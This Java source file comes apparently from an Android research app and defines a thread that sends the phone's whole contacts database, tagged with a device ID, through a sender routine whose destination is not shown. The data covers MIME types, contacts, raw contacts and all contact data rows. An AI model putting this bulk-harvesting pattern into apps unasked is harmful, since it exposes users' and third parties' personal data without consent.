package edu.real.async.android;

import android.content.Context;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.ContactsContract.Contacts;
import android.provider.ContactsContract.Data;
import android.provider.ContactsContract.RawContacts;
import android.util.Log;

public class PersonsSenderThread extends SenderThread {

    public PersonsSenderThread(Context _ctx, String _device_id) {
        super(_ctx, _device_id);
    }

    @Override
    protected void send() {
        try {
            sendAllContent(
                    Uri.withAppendedPath(ContactsContract.AUTHORITY_URI,
                            "mimetypes"),
                    "PM", "p", "MIME Type", "mime-type-send");
        } catch (IllegalArgumentException e) {
            // Does such table really exists?
            Log.w("person-sender", e.toString());
        }
        sendAllContent(Contacts.CONTENT_URI, "PC", "p", "Contact",
                "contact-send");
        sendAllContent(RawContacts.CONTENT_URI, "PR", "p", "RAW Contact",
                "raw-contact-send");
        sendAllContent(Data.CONTENT_URI, "PD", "p", "Contact data",
                "contact-data-send");
    }

}
